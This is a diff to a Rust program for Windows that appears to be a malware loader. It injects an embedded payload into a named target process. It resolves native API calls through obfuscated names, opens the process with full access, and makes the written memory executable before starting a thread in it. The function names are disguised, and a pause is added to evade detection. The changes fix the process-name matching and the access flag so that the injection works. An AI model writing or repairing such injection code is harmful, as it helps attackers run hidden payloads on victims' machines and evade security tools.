@@ -2,14 +2,13 @@
 #![allow(non_snake_case)]
 
 use sysinfo::System;
-use std::ffi::{CString, OsStr};
+use std::ffi::CString;
 use std::include_bytes;
 use std::ptr::null_mut;
 
 use winapi::{
     um::{
-        winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE, PAGE_EXECUTE_READ, THREAD_ALL_ACCESS},
-        lmaccess::ACCESS_ALL,
+        winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE, PAGE_EXECUTE_READ, THREAD_ALL_ACCESS, PROCESS_ALL_ACCESS},
         libloaderapi::{GetModuleHandleA, GetProcAddress},
     },
     shared::{
@@ -63,8 +62,11 @@ type FH = unsafe extern "system" fn(u32, *const i64) -> i32;
 fn boxboxbox(tar: &str) -> Vec<usize> {
     let mut dom: Vec<usize> = Vec::new();
     let s = System::new_all();
-    for pro in s.processes_by_exact_name(OsStr::new(tar)) {
-        dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
+    let tar_lower = tar.to_lowercase();
+    for (_, pro) in s.processes() {
+        if pro.name().to_string_lossy().to_lowercase() == tar_lower {
+            dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
+        }
     }
     dom
 }
@@ -105,7 +107,7 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
         let f_protect: FD = std::mem::transmute(g(OBF_D));
         let f_thread: FE = std::mem::transmute(g(OBF_E));
 
-        let s = f_open(&mut process_handle, ACCESS_ALL, &mut oa, &mut ci);
+        let s = f_open(&mut process_handle, PROCESS_ALL_ACCESS, &mut oa, &mut ci);
         if !NT_SUCCESS(s) { return; }
 
         pause(150);
